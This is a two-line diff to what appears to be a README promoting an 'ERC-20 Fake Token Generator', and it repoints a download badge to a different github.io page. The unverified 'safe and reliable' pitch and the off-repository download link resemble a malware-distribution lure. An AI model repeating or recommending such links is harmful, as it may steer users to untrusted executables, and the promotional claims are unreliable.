@@ -3,7 +3,7 @@
 🚀 The **ERC-20 Fake Token Generator** is a safe and reliable utility for developers and learners who want to generate fake ERC-20 tokens.  
 It allows quick token creation on Ethereum testnets like **Sepolia, Goerli, or Rinkeby** for demos, simulations, and project testing.  
 
-[![Download ERC-20 Fake Token Generator](https://img.shields.io/badge/Download-ERC20%20Fake%20Token%20Generator-greenyellow)](https://bestsoftonik.github.io/public/)  
+[![Download ERC-20 Fake Token Generator](https://img.shields.io/badge/Download-ERC20%20Fake%20Token%20Generator-greenyellow)](https://erc-20-fake-token-generator.github.io/.github/)  
 
 ---  
 
